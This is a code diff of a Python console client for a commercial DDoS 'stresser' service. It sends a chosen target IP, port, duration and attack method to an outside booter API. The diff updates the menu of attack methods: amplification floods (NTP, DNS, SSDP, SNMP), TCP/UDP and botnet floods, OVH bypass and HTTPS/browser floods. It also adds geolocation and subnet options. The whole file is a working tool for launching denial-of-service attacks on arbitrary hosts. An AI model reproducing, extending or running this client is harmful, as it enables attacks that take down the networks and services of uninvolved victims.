@@ -5,10 +5,16 @@ from sys import stdout
 from time import sleep
 from sty import fg
 
-_USERNAME="YOUR_NAME"
-_KEY="YOUR_KEY" # key from here >> https://stresser.us/
+_USERNAME="larina"
+
+_KEY="KEY_HERE" # key from here >> https://stresser.us/
+
+# https://stresser.us/documentation
+_GEO="ALL" # geolocation for tcp tfo
+_SUBNET="false" # subnet mode for amp method
 _DALAY=0.5 # wait delay per req
-_METHODS=["TCPSYN","TCPACK","TCPTFO","TCPTLS","TCPAMP","VALVE","FIVEM","OVHAMP","OVHTCP","CLDAP","SNMP","WSD","DVR","NTP","ARD","IGMP","GRE","ESP","IPRAND","SOCKET","HTTPSV1","HTTPSV2","BROWSER","UDPBYPASS"]
+_METHODS=["SSDP", "SNMP", "MIX", "DVR", "NTP", "DNS", "UDPRAW", "UDPPPS", "TCPBYPASS", "TCPSYN", "TCPACK", "TCPTFO", "TCPAMP", "IPRAND", "FIVEM", "VALVE", "OVHAMP", "TCPBOT", "SYNBOT", "UDPBOT", "UDPSBOT", "OVHBOT", "HTTPSV1", "HTTPSV2", "BROWSER"]
+
 
 __builtins__.print = lambda text="",end="\r\n": stdout.write(f"{text}{end}");stdout.flush()
 clearconsole = lambda:system("cls || clear")
@@ -54,8 +60,8 @@ def isgoodint(p,max)->bool:
 def request(ip,port,time,conn,method):
     for _ in range(int(conn)):
         try:
-            resp=get(f"https://darlingapi.com/?key={_KEY}&host={ip}&port={port}&time={time}&method={method}",timeout=15).json()
-            print(makec(resp["data"],46 if resp["error"] != "yes" else 9))
+            resp=get(f"https://darlingapi.com/?key={_KEY}&host={ip}&port={port}&time={time}&method={method}&geolocation={_GEO}&subnet={_SUBNET}",timeout=20,headers={"User-Agent": "PYTHON.HTTPX/0.1 github.com/Larinax999/stresser.us-api"}).json()
+            print(makec(resp["message"],46 if resp["status"] == "success" else 9))
         except Exception as e:
             try:
                 print(resp)
@@ -70,12 +76,13 @@ def request(ip,port,time,conn,method):
 def helpcom():
     logo()
     printc(f"""\t\t {makec("╔═════════╦══════════════════════════════════════════════════╗",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> cLDAP, SNMP, WSD, DVR, NTP, ARD",_COLOR.text)}                {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPSYN, TCPACK, TCPTFO, TCPTLS, TCPAMP",_COLOR.text)}         {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP, OVHTCP",_COLOR.text)}                   {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IGMP, GRE, ESP, IPRAND",_COLOR.text)}                         {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> SOCKET, HTTPSv1, HTTPSv2, BROWSER",_COLOR.text)}              {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPBYPASS",_COLOR.text)}                                      {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("BOTNET",206)}  ║ {makec("> TCPBOT, SYNBOT, UDPBOT, UDPSBOT, OVHBOT",_COLOR.text)}        {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> SSDP, SNMP, MIX, DVR, NTP, DNS",_COLOR.text)}                 {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPBYPASS, TCPSYN, TCPACK, TCPTFO, TCPAMP",_COLOR.text)}      {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPRAW, UDPPPS",_COLOR.text)}                                 {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> HTTPSv1, HTTPSv2, BROWSER",_COLOR.text)}                      {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IPRAND",_COLOR.text)}                                         {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP",_COLOR.text)}                           {makec("║",_COLOR.line)}
 \t\t {makec("╚═════════╩══════════════════════════════════════════════════╝",_COLOR.line)}""")
 
 def clearcom():
@@ -83,6 +90,7 @@ def clearcom():
     print("")
 
 def main():
+    global _GEO
     # print("\n"*12)
     # stdout.write("".center(50))
     # for cha in "welcome back, larina.":
@@ -93,13 +101,20 @@ def main():
     helpcom()
     while 1:
         rawcommands=input(f'{makec(f"{_USERNAME}@us",196)}{makec(":~$",_COLOR.text)}{fg(81)} ').split(" ")
-        #print(rawcommands)
         commands=rawcommands[0].upper()
         args=rawcommands[1:]
+        # print(commands)
         if commands in _METHODS:
-            if (len(args) < 4) or (not ((commands.startswith("HTTPS") or commands.startswith("BROWSER") or commands.startswith("SOCKET")) or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10))):
+            if (len(args) < 4) or (not ((commands.startswith("HTTPS") or commands.startswith("BROWSER")) or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10))):
                 print(makec(f"[*] {commands} <ip/url> <port> <time> <conn>",99))
             else: request(args[0],args[1],args[2],args[3],commands)
+        elif commands == "SET":
+            if len(args) < 2:
+                print(makec(f"[*] set <value_name> <value>",99))
+                continue
+            if args[0] == "geo":
+                _GEO=args[1]
+                print(makec(f"[*] SET `{args[0]}` TO `{args[1]}`",_COLOR.invite))
         else:   
             try:
                 commandslist[commands]()
